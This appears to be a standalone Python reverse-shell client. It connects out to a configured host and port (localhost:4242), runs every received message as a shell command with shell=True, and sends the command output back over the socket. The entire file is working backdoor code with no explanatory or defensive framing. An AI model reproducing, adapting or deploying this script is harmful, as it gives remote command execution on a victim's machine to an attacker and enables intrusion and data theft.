import socket
import subprocess

def connect_to_host(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    return s

def execute_command(s):
    while True:
        data = s.recv(1024)
        print(data)

        if not data:
            break

        proc = subprocess.Popen(data.decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdout_value = proc.stdout.read() + proc.stderr.read()

        # Check if the connection is still open before trying to send data
        try:
            s.send(stdout_value)
        except BrokenPipeError:
            print("Connection closed by the host.")
            break

def main():
    host = 'localhost'
    port = 4242
    s = connect_to_host(host, port)
    execute_command(s)

if __name__ == "__main__":
    main()